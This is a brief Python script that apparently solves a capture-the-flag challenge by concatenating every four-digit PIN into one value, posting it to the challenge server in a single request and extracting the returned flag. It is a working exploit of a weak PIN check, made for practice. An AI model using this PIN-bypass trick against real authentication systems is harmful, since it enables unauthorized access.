#!/bin/python3

import requests
import re

base_url = 'http://pincode.challs.olicyber.it'

payload = ''
for i in range(1000, 10000):
    payload += f'{i:04}'

r = requests.post(base_url, data={
    'pincode': payload
})

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])